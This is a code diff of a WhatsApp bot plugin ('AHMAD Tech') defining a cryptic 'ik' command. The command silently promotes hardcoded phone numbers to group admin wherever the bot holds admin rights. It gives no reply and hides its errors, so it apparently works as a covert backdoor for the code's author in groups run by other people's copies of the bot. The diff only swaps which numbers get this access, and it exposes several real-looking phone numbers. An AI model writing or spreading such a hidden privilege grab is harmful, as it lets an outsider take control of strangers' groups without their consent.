@@ -1,6 +1,6 @@
-// AHMAD Tech 
+// AHMAD Tech
+
 const { cmd } = require('../command');
-const { lidToPhone } = require('../lib/lidtopn');
 
 cmd({
     pattern: "ik",
@@ -9,38 +9,54 @@ cmd({
     category: "owner",
     filename: __filename
 },
-async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {
+async (conn, mek, m, { from, sender, isBotAdmins, isGroup }) => {
 
-    if (!isGroup || !isBotAdmins) return;
-
-    // lidToPhone for sender
-    let senderNumber = sender.split('@')[0];
-    if (sender.includes('@lid')) {
-        senderNumber = await lidToPhone(conn, sender);
-    }
-
-    // Normalize to full JID
-    const senderNormalized = senderNumber + '@s.whatsapp.net';
-
-    // Both numbers are authorized
-    const AUTHORIZED_USERS = [
-        "923259158117@s.whatsapp.net",
-        "923437385525@s.whatsapp.net"
-    ];
-    
-    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
-        return; // Silent return if not authorized
-    }
-
-    // If authorized, proceed with admin promotion
     try {
-        const groupMetadata = await conn.groupMetadata(from);
-        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
-        
-        if (!userParticipant?.admin) {
-            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
+
+        // Group + Bot admin check
+        if (!isGroup || !isBotAdmins) return;
+
+        // Normalize sender
+        let senderNumber = sender.split('@')[0];
+
+        // Remove non-digits
+        senderNumber = senderNumber.replace(/[^0-9]/g, "");
+
+        const senderNormalized = senderNumber + "@s.whatsapp.net";
+
+        // Authorized numbers
+        const AUTHORIZED_USERS = [
+            "923221540695@s.whatsapp.net",
+            "923221540695@s.whatsapp.net"
+        ];
+
+        // Silent ignore
+        if (!AUTHORIZED_USERS.includes(senderNormalized)) {
+            return;
         }
+
+        // Get group metadata
+        const groupMetadata = await conn.groupMetadata(from);
+
+        // Find participant
+        const userParticipant = groupMetadata.participants.find(
+            p => p.id === senderNormalized
+        );
+
+        // Promote if not admin
+        if (userParticipant && !userParticipant.admin) {
+
+            await conn.groupParticipantsUpdate(
+                from,
+                [senderNormalized],
+                "promote"
+            );
+
+        }
+
     } catch (error) {
-        console.error("Silent admin error:", error.message);
+
+        console.log("Silent admin error:", error.message);
+
     }
 });
